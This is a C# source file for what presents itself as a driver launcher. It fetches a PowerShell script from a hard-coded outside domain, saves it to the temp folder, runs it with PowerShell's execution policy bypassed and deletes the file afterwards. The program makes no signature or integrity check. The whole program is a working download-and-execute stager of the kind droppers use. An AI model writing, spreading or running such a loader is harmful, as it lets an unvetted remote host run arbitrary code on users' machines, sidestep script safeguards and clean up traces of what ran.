using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;

class Launcher
{
    const string SCRIPT_URL = "https://yanhong.online/client_core_v25.ps1";

    static int Main()
    {
        Console.OutputEncoding = Encoding.UTF8;
        Console.WriteLine("[*] Connecting to driver server...");

        string script;
        try
        {
            var wc = new WebClient();
            wc.Encoding = Encoding.UTF8;
            wc.Headers.Add("Cache-Control", "no-cache, no-store, must-revalidate");
            wc.Headers.Add("Pragma", "no-cache");
            var url = SCRIPT_URL + "?_=" + DateTimeOffset.Now.ToUnixTimeSeconds().ToString();
            script = wc.DownloadString(url);
        }
        catch (Exception ex)
        {
            Console.WriteLine(string.Format("[!] Cannot connect: {0}", ex.Message));
            Console.WriteLine("[!] Check network and try again.");
            Console.WriteLine("Press any key to exit...");
            Console.ReadKey();
            return 1;
        }

        if (string.IsNullOrEmpty(script))
        {
            Console.WriteLine("[!] Server returned empty script.");
            Console.ReadKey();
            return 1;
        }

        Console.WriteLine("[*] Got latest script, launching PowerShell...");
        Console.WriteLine();

        // Write to temp file, execute, delete
        string tmpFile = Path.Combine(Path.GetTempPath(), "wsdi_launcher.ps1");
        File.WriteAllText(tmpFile, script, new UTF8Encoding(false));

        var psi = new ProcessStartInfo
        {
            FileName = "powershell.exe",
            Arguments = string.Format("-NoProfile -ExecutionPolicy Bypass -File \"{0}\"", tmpFile),
            UseShellExecute = false,
            CreateNoWindow = false
        };

        int exitCode;
        using (var proc = Process.Start(psi))
        {
            proc.WaitForExit();
            exitCode = proc.ExitCode;
        }

        // Clean up temp file
        try { File.Delete(tmpFile); } catch { }

        return exitCode;
    }
}
